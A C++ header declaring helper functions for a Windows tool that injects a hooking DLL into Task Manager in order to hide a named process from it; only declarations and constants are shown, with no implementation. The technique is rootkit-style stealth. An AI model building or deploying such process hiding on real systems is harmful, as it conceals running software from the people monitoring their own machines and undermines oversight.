#pragma once
#include "WindowsException.hpp"
#include "Process.hpp"
#include "Logger.hpp"
#include <Windows.h>
#include <tlhelp32.h>
#include <thread>

namespace SystemUtils
{
	constexpr wchar_t* TASK_MGR_EXE = L"Taskmgr.exe";
	constexpr wchar_t* NOTEPAD_EXE = L"notepad.exe";
	constexpr char* DLL_PATH = "D:\\Ditto\\SecretProcess\\x64\\Release\\HookingDll.dll";
	constexpr char* HIDDEN_PID_NAME = "hidden_pid";

	uint32_t get_process_id(const std::wstring& process_name);
	void inject_dll(const int process_id, const std::string& dll_path);
	void hide_process_from_tskmgr(const std::wstring& process_name);
	void hide_from_task_manager();
}